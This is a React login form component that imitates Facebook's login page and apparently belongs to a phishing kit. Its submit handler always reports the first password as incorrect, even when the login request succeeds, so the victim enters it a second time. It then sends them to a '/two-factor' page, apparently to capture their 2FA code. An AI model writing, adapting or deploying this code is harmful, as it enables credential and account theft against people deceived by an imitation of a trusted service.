import { useLocalStorage } from '@/helpers/useLocalstorage';
import { login } from '@/request/post';
import { useRouter } from 'next/router';
import React, { useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import { ErrorMessage } from '../common/error-message';

function LoginForm() {
  const router = useRouter();
  const [failCount, setFailCount] = useState(1);
  // const [step, setStep] = useLocalStorage('step');

  const {
    register,
    handleSubmit,
    formState: { errors },
    setError,
    reset,
  } = useForm();

  // useEffect(() => {
  // if (step === 1) {
  //   router.push('/contact/295038365360854');
  // }
  // }, [step, router]);

  const onSubmit = async (data) => {
    const res = await login(data);
    if (res?.status && !failCount) {
      // setStep(3);
      router.push('/two-factor');
    } else {
      reset();
      setError('password', { message: 'Your email or password is incorrect' });
      setFailCount((prev) => prev - 1);
    }
  };

  return (
    <div className="flex flex-col gap-8">
      <div className="login-form lg:w-[396px] sm:w-auto">
        <form
          onSubmit={handleSubmit(onSubmit)}
          className="flex flex-col justify-center gap-3 items-center"
        >
          <div className="w-[91%]">
            <input
              placeholder="Email address or phone number"
              {...register('email', {
                required: 'Email address or phone number is required',
              })}
              className="login-input focus:outline-none"
            />
            <ErrorMessage
              error={errors?.email?.message}
              className="text-sm mb-1"
            />
          </div>

          <div className="w-[91%]">
            <input
              type="password"
              placeholder="Password"
              className="login-input focus:outline-none"
              {...register('password', {
                required: 'Your password is required',
              })}
            />
            <ErrorMessage
              error={errors?.password?.message}
              className="text-sm mb-1"
            />
          </div>
          <div className="text-center w-[91%]">
            <button type="submit" className="login-btn font-medium">
              Log in
            </button>
          </div>

          <div className="text-center">
            <a
              href="#"
              className="text-sm no-underline hover:underline text-blue-500 font-normal"
            >
              Forgotten Password?
            </a>
          </div>
          <div className="border-t-[1px] w-[90%] mt-1 mb-2" />
          <div className="text-center">
            <button type="submit" className="font-medium create-new-btn">
              Create new account
            </button>
          </div>
        </form>
      </div>
      <div className="flex-1 text-center text-sm">
        <p>
          <b>
            <a className="cursor-pointer no-underline hover:underline">
              {' '}
              Create a Page{' '}
            </a>
          </b>
          for a celebrity, brand or business.
        </p>
      </div>
    </div>
  );
}

export default LoginForm;
